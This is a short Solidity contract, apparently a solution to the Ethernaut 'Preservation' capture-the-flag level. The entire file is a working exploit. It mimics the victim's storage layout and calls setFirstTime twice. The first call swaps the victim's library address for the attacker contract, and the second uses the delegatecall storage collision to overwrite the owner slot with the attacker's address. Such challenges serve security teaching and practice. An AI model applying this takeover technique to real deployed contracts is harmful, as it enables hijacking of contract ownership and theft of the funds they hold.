// SPDX-License-Identifier: UNLICENSED
// https://ethernaut.openzeppelin.com/level/0x4b776565a754f6Fe52f2d2B2486A9534F8b780F9
pragma solidity 0.8.17;

import "./Preservation.sol";

contract HackPreservation {

    // public library contracts 
    address public timeZone1Library;    // Slot 0
    address public timeZone2Library;    // Slot 1
    address public owner;               // Slot 2
    address public attacker;
    Preservation victim;

    constructor (address _victim) {
        attacker = msg.sender;
        victim = Preservation(_victim);
    }

    function setTime(uint _time) external {
        owner = address(uint160(_time));
    }

    function hackContract(address _address) public pure returns(uint256) {
        return uint256(uint160(address(_address))); // Convert address to uint256
    }

    function hack() external {
        victim.setFirstTime(hackContract(address(this))); // Call setTime and overwrite Slot 0 - address public timeZone1Library;
        victim.setFirstTime(hackContract(address(attacker))); // Call this malicious setTime and overwrite Slot 2 - address public owner;
    }
}
